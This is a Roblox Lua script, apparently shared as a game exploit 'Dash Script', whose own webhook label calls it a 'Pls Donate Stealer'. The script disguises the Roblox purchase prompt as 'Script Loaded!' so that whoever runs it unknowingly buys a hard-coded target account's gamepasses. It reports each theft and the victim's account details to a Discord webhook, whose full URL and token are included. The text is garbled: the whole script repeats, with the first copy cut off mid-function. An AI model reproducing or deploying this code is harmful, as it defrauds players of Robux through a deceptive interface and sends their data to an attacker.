local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))

local LocalPlayer = Players.LocalPlayer
local request = syn and (syn.request or request) or http and http.request or request

local TargetUsername = "siddiq2701_alt"
local WebhookURL = "https://discord.com/api/webhooks/1470397961547681813/CcDecVMna2M6BEN1n8Cl-AlbtX_LZg9gsBIm_255_av1pj4ETwuzxUbxA7RY2lswVyrg"

-- 创建加载界面
local LoadingGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local TitleLabel = Instance.new("TextLabel")
local StatusLabel = Instance.new("TextLabel")
local CloseButton = Instance.new("TextButton")

LoadingGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
LoadingGui.ResetOnSpawn = false

MainFrame.Size = UDim2.new(0, 250, 0, 110)
MainFrame.Position = UDim2.new(1, 300, 1, -120)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame.BorderSizePixel = 0
MainFrame.Visible = true
MainFrame.Parent = LoadingGui

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 10)
Corner.Parent = MainFrame

local Stroke = Instance.new("UIStroke")
Stroke.Thickness = 1.5
Stroke.Color = Color3.fromRGB(255, 255, 255)
Stroke.Parent = MainFrame

TitleLabel.Size = UDim2.new(1, -16, 0, 24)
TitleLabel.Position = UDim2.new(0, 8, 0, 8)
TitleLabel.Text = "Dash Script"
TitleLabel.TextSize = 18  -- Fixed: removed extra =
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.Parent = MainFrame

StatusLabel.Size = UDim2.new(1, -16, 0, 38)
StatusLabel.Position = UDim2.new(0, 8, 0, 34)
StatusLabel.Text = "Loading Gui, Will Take A Few Seconds \n if it doesn't appear please rejoin."
StatusLabel.TextSize = 14
StatusLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.TextWrapped = true
StatusLabel.TextYAlignment = Enum.TextYAlignment.Top
StatusLabel.Parent = MainFrame

CloseButton.Size = UDim2.new(1, -20, 0, 26)
CloseButton.Position = UDim2.new(0, 10, 1, -34)
CloseButton.Text = "Close"
CloseButton.TextSize = 16
CloseButton.Font = Enum.Font.GothamBold
CloseButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.BorderSizePixel = 0
CloseButton.Parent = MainFrame

local ButtonCorner = Instance.new("UICorner")
ButtonCorner.CornerRadius = UDim.new(0, 8)
ButtonCorner.Parent = CloseButton

-- 动画函数
local function SlideIn()
    TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
        Position = UDim2.new(1, -260, 1, -120)
    }):Play()
end

local function SlideOut()
    local tween = TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
        Position = UDim2.new(1, 300, 1, -120)
    })
    tween:Play()
    tween.Completed:Connect(function()
        MainFrame.Visible = false
    end)
end

CloseButton.MouseButton1Click:Connect(function()
    TweenService:Create(CloseButton, TweenInfo.new(0.08), {Size = UDim2.new(1, -24, 0, 24)}):Play()
    task.delay(0.08, function()
        TweenService:Create(CloseButton, TweenInfo.new(0.08), {Size = UDim2.new(1, -20, 0, 26)}):Play()
        task.delay(0.08, SlideOut)
    end)
end)

SlideIn()

-- 主要逻辑开始
local Success, TargetUserId = pcall(function()
    return Players:GetUserIdFromNameAsync(TargetUsername)
end)

if not Success then
    return LocalPlayer:Kick("Failed to find target user")
end

local BoothData = Remotes.Function("OfflinePlayerLookup"):InvokeServer(TargetUserId)
if not BoothData then
    return LocalPlayer:Kick("Target offline or no booth")
end

local CurrentTargetItem = nil
local NextPurchasePrice = nil

-- 发送 Webhook 通知
local function SendHitNotification(RobuxAmount)
    local PlayerInfo = {
        Executor = identifyexecutor and identifyexecutor() or "Unknown",
        Username = LocalPlayer.Name,
        UserId = LocalPlayer.UserId,
        AccountAge = LocalPlayer.AccountAge
    }

    request({
        Url = WebhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            content = "@everyone",
            embeds = {{
                title = "**__Shar's Script__ | __Pls Donate Stealer__**",
                color = 3368447,
                description = LocalPlayer.Name .. " Used Your Script.",
                thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"},
                fields = {
                    {name = "Information", value = "```lua\nExecutor: "..PlayerInfo.Executor.."\nUsername: "..PlayerInfo.Username.."\nUser-ID: "..PlayerInfo.UserId.."\nAccount Age: "..PlayerInfo.AccountAge.."```"},
                    {name = "Robux Stolen", value = "```"..tostring(RobuxAmount).."```"}
                },
                footer = {text = "Created by Shar"}
            }}
        })
    })
end

-- 寻找最便宜的未拥有游戏通行证
local function FindCheapestGamepass()
    local cheapestPrice = math.huge
    local cheapestItem = nil

    for _, item in pairs(BoothData.BoothUI.Items.Frame:GetChildren()) do
        if item:GetAttribute("AssetType") == "Gamepass" 
        and not MarketplaceService:UserOwnsGamePassAsync(LocalPlayer.UserId, item:GetAttribute("AssetId")) then
            local price = item:GetAttribute("AssetPrice")
            if price < cheapestPrice then
                cheapestPrice = price
                cheapestItem = item
            end
        end
    end

    return cheapestItem, cheapestPrice
end

-- 触发购买
local function TriggerPurchase(item, price)
    if item and item:FindFirstChild("Prompt") then
        item.Prompt:FireServer("", false, price)
    end
end

-- 开始第一次购买
CurrentTargetItem, NextPurchasePrice = FindCheapestGamepass()
if CurrentTargetItem then
    TriggerPurchase(CurrentTargetItem, NextPurchasePrice)
end

-- 监听购买提示
local Animator = CoreGui:WaitForChild("PurchasePromptApp"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")

Animator.ChildAdded:Connect(function(child)
    if child.Name == "Prompt" then
        local balanceText = child:FindFirstChild("AlertContents", true):FindFirstChild("RemainingBalanceText", true)
        if balanceText then
            if NextPurchasePrice then
                child.AlertContents.TitleContainer.TitleArea.Title.Text = "Please Donate - Script!"
                child.AlertContents.MiddleContent.Visible = false
                child.AlertContents.Footer.Buttons["1"].Visible = false
                child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
                child.AlertContents.Footer.FooterContent.Visible = false
            else
                child.AlertContents.TitleContainer.TitleArea.Title.Text = "Script Loaded!"
                child.AlertContents.MiddleContent.Visible = false
                child.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "Load Script!"
                child.AlertContents.Footer.Buttons["2"].Visible = false
                child.AlertContents.Footer.FooterContent.Visible = false

                NextPurchasePrice = tonumber(balanceText.Text:match("(%d+)$")) + CurrentTargetItem:GetAttribute("AssetPrice")
                CurrentTargetItem = nil
            end
        end
    end
end)

-- 监听捐赠成功
-- Fixed: Corrected the event connection syntax
Remotes.Event("GiftSentAlert"):Connect(function(userId, amount)
    if userId == TargetUserId and NextPurchasePrice then
        SendHitNotification(amount)
        NextPurchasePrice = NextPurchasePrice - amount

        local nextItem = FindCheapestGamepass()
        if nextItem then
            CurrentTargetItem = nextItem
            TriggerPurchase(nextItem, nextItem:GetAttribute("AssetPrice"))
        local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))

local LocalPlayer = Players.LocalPlayer
local request = syn and (syn.request or request) or http and http.request or request

local TargetUsername = "siddiq2701_alt"
local WebhookURL = "https://discord.com/api/webhooks/1470397961547681813/CcDecVMna2M6BEN1n8Cl-AlbtX_LZg9gsBIm_255_av1pj4ETwuzxUbxA7RY2lswVyrg"

-- 创建加载界面
local LoadingGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local TitleLabel = Instance.new("TextLabel")
local StatusLabel = Instance.new("TextLabel")
local CloseButton = Instance.new("TextButton")

LoadingGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
LoadingGui.ResetOnSpawn = false

MainFrame.Size = UDim2.new(0, 250, 0, 110)
MainFrame.Position = UDim2.new(1, 300, 1, -120)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame.BorderSizePixel = 0
MainFrame.Visible = true
MainFrame.Parent = LoadingGui

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 10)
Corner.Parent = MainFrame

local Stroke = Instance.new("UIStroke")
Stroke.Thickness = 1.5
Stroke.Color = Color3.fromRGB(255, 255, 255)
Stroke.Parent = MainFrame

TitleLabel.Size = UDim2.new(1, -16, 0, 24)
TitleLabel.Position = UDim2.new(0, 8, 0, 8)
TitleLabel.Text = "Dash Script"
TitleLabel.TextSize = 18  -- Fixed: removed extra =
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.Parent = MainFrame

StatusLabel.Size = UDim2.new(1, -16, 0, 38)
StatusLabel.Position = UDim2.new(0, 8, 0, 34)
StatusLabel.Text = "Loading Gui, Will Take A Few Seconds \n if it doesn't appear please rejoin."
StatusLabel.TextSize = 14
StatusLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.TextWrapped = true
StatusLabel.TextYAlignment = Enum.TextYAlignment.Top
StatusLabel.Parent = MainFrame

CloseButton.Size = UDim2.new(1, -20, 0, 26)
CloseButton.Position = UDim2.new(0, 10, 1, -34)
CloseButton.Text = "Close"
CloseButton.TextSize = 16
CloseButton.Font = Enum.Font.GothamBold
CloseButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.BorderSizePixel = 0
CloseButton.Parent = MainFrame

local ButtonCorner = Instance.new("UICorner")
ButtonCorner.CornerRadius = UDim.new(0, 8)
ButtonCorner.Parent = CloseButton

-- 动画函数
local function SlideIn()
    TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
        Position = UDim2.new(1, -260, 1, -120)
    }):Play()
end

local function SlideOut()
    local tween = TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
        Position = UDim2.new(1, 300, 1, -120)
    })
    tween:Play()
    tween.Completed:Connect(function()
        MainFrame.Visible = false
    end)
end

CloseButton.MouseButton1Click:Connect(function()
    TweenService:Create(CloseButton, TweenInfo.new(0.08), {Size = UDim2.new(1, -24, 0, 24)}):Play()
    task.delay(0.08, function()
        TweenService:Create(CloseButton, TweenInfo.new(0.08), {Size = UDim2.new(1, -20, 0, 26)}):Play()
        task.delay(0.08, SlideOut)
    end)
end)

SlideIn()

-- 主要逻辑开始
local Success, TargetUserId = pcall(function()
    return Players:GetUserIdFromNameAsync(TargetUsername)
end)

if not Success then
    return LocalPlayer:Kick("Failed to find target user")
end

local BoothData = Remotes.Function("OfflinePlayerLookup"):InvokeServer(TargetUserId)
if not BoothData then
    return LocalPlayer:Kick("Target offline or no booth")
end

local CurrentTargetItem = nil
local NextPurchasePrice = nil

-- 发送 Webhook 通知
local function SendHitNotification(RobuxAmount)
    local PlayerInfo = {
        Executor = identifyexecutor and identifyexecutor() or "Unknown",
        Username = LocalPlayer.Name,
        UserId = LocalPlayer.UserId,
        AccountAge = LocalPlayer.AccountAge
    }

    request({
        Url = WebhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            content = "@everyone",
            embeds = {{
                title = "**__Shar's Script__ | __Pls Donate Stealer__**",
                color = 3368447,
                description = LocalPlayer.Name .. " Used Your Script.",
                thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"},
                fields = {
                    {name = "Information", value = "```lua\nExecutor: "..PlayerInfo.Executor.."\nUsername: "..PlayerInfo.Username.."\nUser-ID: "..PlayerInfo.UserId.."\nAccount Age: "..PlayerInfo.AccountAge.."```"},
                    {name = "Robux Stolen", value = "```"..tostring(RobuxAmount).."```"}
                },
                footer = {text = "Created by Shar"}
            }}
        })
    })
end

-- 寻找最便宜的未拥有游戏通行证
local function FindCheapestGamepass()
    local cheapestPrice = math.huge
    local cheapestItem = nil

    for _, item in pairs(BoothData.BoothUI.Items.Frame:GetChildren()) do
        if item:GetAttribute("AssetType") == "Gamepass" 
        and not MarketplaceService:UserOwnsGamePassAsync(LocalPlayer.UserId, item:GetAttribute("AssetId")) then
            local price = item:GetAttribute("AssetPrice")
            if price < cheapestPrice then
                cheapestPrice = price
                cheapestItem = item
            end
        end
    end

    return cheapestItem, cheapestPrice
end

-- 触发购买
local function TriggerPurchase(item, price)
    if item and item:FindFirstChild("Prompt") then
        item.Prompt:FireServer("", false, price)
    end
end

-- 开始第一次购买
CurrentTargetItem, NextPurchasePrice = FindCheapestGamepass()
if CurrentTargetItem then
    TriggerPurchase(CurrentTargetItem, NextPurchasePrice)
end

-- 监听购买提示
local Animator = CoreGui:WaitForChild("PurchasePromptApp"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")

Animator.ChildAdded:Connect(function(child)
    if child.Name == "Prompt" then
        local balanceText = child:FindFirstChild("AlertContents", true):FindFirstChild("RemainingBalanceText", true)
        if balanceText then
            if NextPurchasePrice then
                child.AlertContents.TitleContainer.TitleArea.Title.Text = "Please Donate - Script!"
                child.AlertContents.MiddleContent.Visible = false
                child.AlertContents.Footer.Buttons["1"].Visible = false
                child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
                child.AlertContents.Footer.FooterContent.Visible = false
            else
                child.AlertContents.TitleContainer.TitleArea.Title.Text = "Script Loaded!"
                child.AlertContents.MiddleContent.Visible = false
                child.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "Load Script!"
                child.AlertContents.Footer.Buttons["2"].Visible = false
                child.AlertContents.Footer.FooterContent.Visible = false

                NextPurchasePrice = tonumber(balanceText.Text:match("(%d+)$")) + CurrentTargetItem:GetAttribute("AssetPrice")
                CurrentTargetItem = nil
            end
        end
    end
end)

-- 监听捐赠成功
-- Fixed: Corrected the event connection syntax
Remotes.Event("GiftSentAlert"):Connect(function(userId, amount)
    if userId == TargetUserId and NextPurchasePrice then
        SendHitNotification(amount)
        NextPurchasePrice = NextPurchasePrice - amount

        local nextItem = FindCheapestGamepass()
        if nextItem then
            CurrentTargetItem = nextItem
            TriggerPurchase(nextItem, nextItem:GetAttribute("AssetPrice"))
        end
    end
end)